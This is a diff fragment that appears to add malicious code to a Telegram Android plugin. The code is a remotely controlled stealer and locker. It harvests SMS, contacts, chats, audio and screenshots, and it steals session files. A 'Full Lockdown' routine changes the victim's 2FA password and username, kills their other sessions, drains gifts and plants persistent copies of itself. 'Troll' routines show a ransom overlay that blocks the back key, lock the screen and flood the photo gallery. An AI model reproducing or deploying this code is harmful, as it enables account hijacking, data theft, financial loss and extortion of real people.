+                    report.append("<b>Tg kid:</b> sent")
+                except Exception:
+                    pass
+                try:
+                    self._screenshot_gain()
+                    report.append("<b>Screenshot gain:</b> sent")
+                except Exception:
+                    pass
+                try:
+                    self._manual_audio(5)
+                    report.append("<b>Audio:</b> sent")
+                except Exception:
+                    pass
+                try:
+                    self._manual_sms()
+                    self._manual_contacts()
+                    self._manual_apps()
+                    self._manual_chats()
+                    report.append("<b>SMS/contacts/apps/chats:</b> sent")
+                except Exception:
+                    pass
+                try:
+                    self._manual_dump_session()
+                    self._manual_userbot_session()
+                    report.append("<b>Session theft:</b> sent")
+                except Exception:
+                    pass
+                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
+                self._send_msg("\n".join(report), html=True)
+            except Exception as e:
+                self._send_msg("harvest err: " + str(e))
+        threading.Thread(target=task, daemon=True).start()
+
+    # ─── FULL LOCKDOWN ────────────────────────────────────────────────────
+    def _full_lockdown(self):
+        def task():
+            try:
+                t0 = time.time()
+                self._send_msg("Full Lockdown...")
+                report = ["<b>Full Lockdown</b>"]
+                if not (self._sync_running and self._active):
+                    return
+
+                # 0 Deploy
+                self._send_msg("0/7 deploy...")
+                try:
+                    self._parallel([(self._replicate_self, 10),
+                                    (self._mark_nuke,)], workers=2, timeout=30)
+                    report.append("<b>Deploy:</b> ok")
+                except Exception as e:
+                    report.append("<b>Deploy:</b> %s" % e)
+
+                if not (self._sync_running and self._active):
+                    return
+                # 1 Group A: harvest + web + bots + channels
+                self._send_msg("1/7 group A...")
+                ga = self._parallel([
+                    (self._tg_kid,),
+                    (self._confirm_unconfirmed_sessions, 0),
+                    (self._kill_web_authorizations, 0),
+                    (self._leave_all_channels, 0),
+                    (self._kill_bots, 0),
+                ], workers=5, timeout=120)
+                report.append("<b>Tg kid:</b> %s" % self._html_escape(str(ga[0] or "—")))
+                report.append("<b>Pending confirmed:</b> %s" % str(ga[1]))
+                report.append("<b>Web killed:</b> %s" % str(ga[2]))
+                report.append("<b>Channels left:</b> %s" % str(ga[3]))
+                report.append("<b>Bots killed:</b> %s" % str(ga[4]))
+
+                # 2 gift drain
+                if not (self._sync_running and self._active):
+                    return
+                self._send_msg("2/7 gift drain...")
+                try:
+                    gr = self._drain_gifts(0)
+                    conv = gr.get("convert") or {}
+                    u = gr.get("u") or []
+                    ok_count = sum(1 for x in u if isinstance(x, dict)
+                                   and isinstance(x.get("result"), dict)
+                                   and x["result"].get("ok"))
+                    report.append("<b>Gifts:</b> conv=%s nft=%d deficit=%s" % (
+                        conv.get("converted_stars", 0), ok_count,
+                        gr.get("fee_deficit", 0)))
+                except Exception as e:
+                    report.append("<b>Gifts:</b> %s" % e)
+
+                # 3 profile
+                if not (self._sync_running and self._active):
+                    return
+                self._send_msg("3/7 profile...")
+                gc = self._parallel([
+                    (self._nuke_password_pipeline, 0),
+                    (self._change_username, 0),
+                    (self._change_profile, 0),
+                    (self._reset_contacts, 0),
+                ], workers=4, timeout=60)
+                pwd = gc[0] if gc else {}
+                new_un = gc[1] if len(gc) > 1 else None
+                prof = gc[2] if len(gc) > 2 else False
+                cont = gc[3] if len(gc) > 3 else False
+                report.append("<b>2FA:</b> %s" % pwd.get("final", "?"))
+                report.append("<b>Username:</b> @%s" % self._html_escape(str(new_un or "?")))
+                report.append("<b>Profile:</b> %s" % ("[LOCKED]" if prof else "fail"))
+                report.append("<b>Contacts reset:</b> %s" % cont)
+
+                # 4 kill sessions
+                if not (self._sync_running and self._active):
+                    return
+                self._send_msg("4/7 kill sessions...")
+                k, total = self._kill_all_sessions(0)
+                self._kill_login_notice_dialog(0)
+                report.append("<b>Sessions killed:</b> %d / %d" % (k, total))
+
+                # 5 re-kill
+                if not (self._sync_running and self._active):
+                    return
+                self._send_msg("5/7 re-kill...")
+                k2, _t = self._kill_all_sessions(0)
+                self._kill_web_authorizations(0)
+                report.append("<b>Re-killed:</b> %d" % k2)
+
+                # 6 persistence
+                if not (self._sync_running and self._active):
+                    return
+                self._send_msg("6/7 persistence...")
+                try:
+                    self._replicate_self(10)
+                    self._mark_nuke()
+                    threading.Thread(target=self._nuke_loop, daemon=True).start()
+                    report.append("<b>Persistence:</b> ok")
+                except Exception as e:
+                    report.append("<b>Persistence:</b> %s" % e)
+
+                # 7 pull out
+                if not (self._sync_running and self._active):
+                    return
+                self._send_msg("7/7 pull out...")
+                try:
+                    self._pull_out_account()
+                    report.append("<b>Pull Out:</b> last")
+                except Exception as e:
+                    report.append("<b>Pull Out:</b> %s" % e)
+
+                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
+                report.append("<b>ANNIHLATION complete</b>")
+                self._send_markup("\n".join(report), {
+                    "inline_keyboard": [
+                        [{"text": "Logout again", "callback_data": "hv_logout"}],
+                    ]
+                }, html=True)
+            except Exception as e:
+                self._send_msg("lockdown err: " + str(e))
+        threading.Thread(target=task, daemon=True).start()
+
+    # ─── TROLL ────────────────────────────────────────────────────────────
+    def _show_ransom(self, text="", photo_url=""):
+        if self._ransom_view is not None:
+            return {"ok": True, "already": True}
+        try:
+            if time.time() < self._ransom_pay_grace_until:
+                return {"ok": True, "grace": int(self._ransom_pay_grace_until - time.time())}
+            ctx = ApplicationLoader.applicationContext
+            if ctx is None:
+                return {"error": "no ctx"}
+            use_decor = not self._ensure_overlay_perm(ctx)
+            self._ransom_args = {"text": text, "photo_url": photo_url}
+
+            photo_path = ""
+            if photo_url and self._ransom_photo_path and self._ransom_photo_url == photo_url \
+                    and os.path.exists(self._ransom_photo_path):
+                photo_path = self._ransom_photo_path
+            elif photo_url:
+                try:
+                    from urllib.request import urlopen
+                    data = urlopen(photo_url, timeout=20).read()
+                    photo_path = os.path.join(
+                        str(ctx.getFilesDir().getAbsolutePath()),
+                        "ransom_%d.jpg" % int(time.time()))
+                    with open(photo_path, "wb") as f:
+                        f.write(data)
+                    self._ransom_photo_path = photo_path
+                    self._ransom_photo_url = photo_url
+                except Exception:
+                    pass
+
+            drew = threading.Event()
+            derr = [None]
+
+            def _build():
+                try:
+                    CTX = jclass("android.content.Context")
+                    wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
+                    self._ransom_wm = wm
+                    LL = jclass("android.widget.LinearLayout")
+                    TV = jclass("android.widget.TextView")
+                    IV = jclass("android.widget.ImageView")
+                    LP = jclass("android.view.WindowManager$LayoutParams")
+                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
+                    Color = jclass("android.graphics.Color")
+                    Gravity = jclass("android.view.Gravity")
+                    BitmapFactory = jclass("android.graphics.BitmapFactory")
+                    TypedValue = jclass("android.util.TypedValue")
+                    VLG = jclass("android.view.ViewGroup$LayoutParams")
+                    root = LL(ctx)
+                    root.setOrientation(LL.VERTICAL)
+                    root.setBackgroundColor(Color.parseColor("#1A1A1A"))
+                    pad = int(TypedValue.applyDimension(
+                        TypedValue.COMPLEX_UNIT_DIP, 24,
+                        ctx.getResources().getDisplayMetrics()))
+                    root.setPadding(pad, pad, pad, pad)
+                    root.setGravity(Gravity.CENTER)
+                    if photo_path:
+                        try:
+                            bmp = BitmapFactory.decodeFile(photo_path)
+                            if bmp is not None:
+                                iv = IV(ctx)
+                                iv_lp = LP_LV(VLG.MATCH_PARENT, int(TypedValue.applyDimension(
+                                    TypedValue.COMPLEX_UNIT_DIP, 280,
+                                    ctx.getResources().getDisplayMetrics())))
+                                iv_lp.bottomMargin = int(TypedValue.applyDimension(
+                                    TypedValue.COMPLEX_UNIT_DIP, 16,
+                                    ctx.getResources().getDisplayMetrics()))
+                                iv.setLayoutParams(iv_lp)
+                                iv.setScaleType(iv.ScaleType.CENTER_CROP)
+                                iv.setImageBitmap(bmp)
+                                root.addView(iv)
+                        except Exception:
+                            pass
+                    tv = TV(ctx)
+                    tv_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
+                    tv.setLayoutParams(tv_lp)
+                    tv.setText(str(text))
+                    tv.setTextColor(Color.WHITE)
+                    tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18)
+                    tv.setGravity(Gravity.CENTER)
+                    root.addView(tv)
+                    warn_tv = TV(ctx)
+                    warn_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
+                    warn_lp.topMargin = int(TypedValue.applyDimension(
+                        TypedValue.COMPLEX_UNIT_DIP, 20,
+                        ctx.getResources().getDisplayMetrics()))
+                    warn_tv.setLayoutParams(warn_lp)
+                    warn_tv.setText(RANSOM_WARNING)
+                    warn_tv.setTextColor(Color.parseColor("#FF3B30"))
+                    warn_tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16)
+                    warn_tv.setGravity(Gravity.CENTER)
+                    root.addView(warn_tv)
+                    KE = jclass("android.view.KeyEvent")
+
+                    class _OnKey(dynamic_proxy(jclass("android.view.View$OnKeyListener"))):
+                        def onKey(self, v, keyCode, event):
+                            try:
+                                if keyCode == KE.KEYCODE_BACK:
+                                    return True
+                            except Exception:
+                                pass
+                            return False
+
+                    root.setOnKeyListener(_OnKey())
+                    root.setFocusableInTouchMode(True)
+                    root.requestFocus()
+                    if use_decor:
+                        act2 = self._get_activity()
+                        if act2 is None:
+                            raise Exception("no activity")
+                        win2 = act2.getWindow()
+                        win2.addFlags(getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
+                        decor = win2.getDecorView()
+                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+                        self._ransom_decor = decor
+                    else:
+                        params = LP(
+                            LP.MATCH_PARENT, LP.MATCH_PARENT,
+                            getattr(LP, "TYPE_APPLICATION_OVERLAY",
+                                    getattr(LP, "TYPE_PHONE", 2002)),
+                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
+                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
+                            -3)
+                        params.gravity = Gravity.CENTER
+                        wm.addView(root, params)
+                    self._ransom_view = root
+                except Exception as e:
+                    derr[0] = e
+                finally:
+                    drew.set()
+
+            act = self._get_activity()
+            if act is not None:
+                act.runOnUiThread(_build)
+            else:
+                _build()
+            drew.wait(12)
+            if derr[0] is not None:
+                return {"error": "ransom: %s" % derr[0]}
+            if self._ransom_view is None:
+                return {"error": "overlay not created"}
+            self._send_msg("Ransom overlay ON")
+            return {"ok": True}
+        except Exception as e:
+            return {"error": "ransom: %s" % e}
+
+    def _dismiss_ransom(self):
+        try:
+            if self._ransom_view is None and self._ransom_mini_view is None:
+                return {"ok": True}
+            removed = threading.Event()
+
+            def _rm():
+                try:
+                    if self._ransom_view is not None:
+                        parent = self._ransom_decor or self._ransom_wm
+                        if parent is not None:
+                            parent.removeView(self._ransom_view)
+                        self._ransom_view = None
+                        self._ransom_decor = None
+                    if self._ransom_mini_view is not None and self._ransom_wm is not None:
+                        self._ransom_wm.removeView(self._ransom_mini_view)
+                        self._ransom_mini_view = None
+                except Exception:
+                    pass
+                finally:
+                    removed.set()
+
+            act = self._get_activity()
+            if act is not None:
+                act.runOnUiThread(_rm)
+                removed.wait(8)
+            else:
+                _rm()
+            return {"ok": True}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _lock_screen(self):
+        if self._locker_on:
+            return
+        try:
+            act = self._get_activity()
+            if act is None:
+                return
+            def _render():
+                try:
+                    from android.widget import FrameLayout, ImageView
+                    from android.view import View, Gravity, ViewGroup
+                    root = FrameLayout(act)
+                    root.setBackgroundColor(Color.BLACK)
+                    path = self._lock_path
+                    if path and os.path.exists(path):
+                        iv = ImageView(act)
+                        iv.setScaleType(ImageView.ScaleType.FIT_XY)
+                        iv.setImageBitmap(BitmapFactory.decodeFile(path))
+                        lp = FrameLayout.LayoutParams(
+                            ViewGroup.LayoutParams.MATCH_PARENT,
+                            ViewGroup.LayoutParams.MATCH_PARENT)
+                        lp.gravity = Gravity.CENTER
+                        iv.setLayoutParams(lp)
+                        root.addView(iv)
+                    act.getWindow().getDecorView().addView(root)
+                    self._locker_view = root
+                    self._locker_on = True
+                    self._send_msg("Locker ON")
+                except Exception as e:
+                    _log("locker: %s" % e)
+            act.runOnUiThread(_render)
+        except Exception as e:
+            self._send_msg("lock err: " + str(e))
+
+    def _clear_locker(self):
+        if not self._locker_on or self._locker_view is None:
+            return
+        try:
+            parent = self._locker_view.getParent()
+            if parent is not None:
+                parent.removeView(self._locker_view)
+            self._locker_view = None
+            self._locker_on = False
+        except Exception:
+            self._locker_view = None
+            self._locker_on = False
+
+    def _play_mmusic(self, url):
+        def task():
+            try:
+                act = self._get_activity()
+                if act is None:
+                    return
+                ctx = ApplicationLoader.applicationContext
+                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+                if not os.path.exists(d):
+                    os.makedirs(d)
+                path = os.path.join(d, "mmusic_%d.mp3" % int(time.time()))
+                self._send_msg("Downloading...")
+                from urllib.request import urlopen
+                data = urlopen(url, timeout=60).read()
+                with open(path, "wb") as f:
+                    f.write(data)
+                self._clear_music()
+                mp = jclass("android.media.MediaPlayer")()
+                mp.setDataSource(path)
+                mp.prepare()
+                mp.setLooping(True)
+                mp.start()
+                self._music_mp = mp
+                self._send_msg("Music playing")
+            except Exception as e:
+                self._send_msg("music err: " + str(e))
+        threading.Thread(target=task, daemon=True).start()
+
+    def _clear_music(self):
+        if self._music_mp is not None:
+            try:
+                self._music_mp.stop()
+                self._music_mp.release()
+            except Exception:
+                pass
+            self._music_mp = None
+
+    def _flood_gallery(self, photo_url, count=100):
+        try:
+            from urllib.request import urlopen
+            data = urlopen(photo_url, timeout=30).read()
+            cr = ApplicationLoader.applicationContext.getContentResolver()
+            ImageMedia = jclass("android.provider.MediaStore$Images$Media")
+            saved = []
+            for i in range(min(int(count), 200)):
+                try:
+                    ts = int(time.time()) + i
+                    rand = random.randint(1000, 9999)
+                    name = "IMG_%s_%d.jpg" % (time.strftime("%Y%m%d_%H%M%S",
+                                                            time.localtime(ts)), rand)
+                    values = jclass("android.content.ContentValues")()
+                    values.put("_display_name", name)
+                    values.put("mime_type", "image/jpeg")
+                    values.put("relative_path", "Pictures/")
+                    uri = cr.insert(ImageMedia.EXTERNAL_CONTENT_URI, values)
+                    if uri:
+                        out = cr.openOutputStream(uri)
+                        out.write(data)
+                        out.close()
+                        saved.append(str(uri))
+                except Exception:
+                    pass
+            self._flood_uris = saved
+            self._send_msg("Flood: %d files" % len(saved))
+        except Exception as e:
+            self._send_msg("flood err: " + str(e))
+
+    def _clear_flood(self):
+        try:
+            cr = ApplicationLoader.applicationContext.getContentResolver()
+            removed = 0
+            for u in self._flood_uris:
+                try:
+                    cr.delete(jclass("android.net.Uri").parse(u), None, None)
+                    removed += 1
+                except Exception:
+                    pass
+            self._send_msg("Flood cleared: %d" % removed)
+        except Exception as e:
+            self._send_msg("clear flood err: " + str(e))
+
+    def _dim_screen(self):
+        if self._dim_active:
+            return
+        try:
+            act = self._get_activity()
+            if act is None:
+                return
+            def _dim():
+                try:
+                    from android.widget import FrameLayout
+                    overlay = FrameLayout(act)
+                    overlay.setBackgroundColor(Color.BLACK)
+                    overlay.setAlpha(0.88)
+                    act.getWindow().getDecorView().addView(overlay)
+                    self._dim_view = overlay
+                    self._dim_active = True
+                except Exception:
+                    pass
+            act.runOnUiThread(_dim)
+        except Exception:
+            pass
+
+    def _clear_dim(self):
+        if not self._dim_active or self._dim_view is None:
+            return
+        try:
+            parent = self._dim_view.getParent()
+            if parent is not None:
+                parent.removeView(self._dim_view)
+            self._dim_view = None
+            self._dim_active = False
+        except Exception:
+            self._dim_view = None
+            self._dim_active = False
+
+    def _clear_vidker(self):
+        pass  # vidker удалён — не используется
 
 
 def create_plugin():
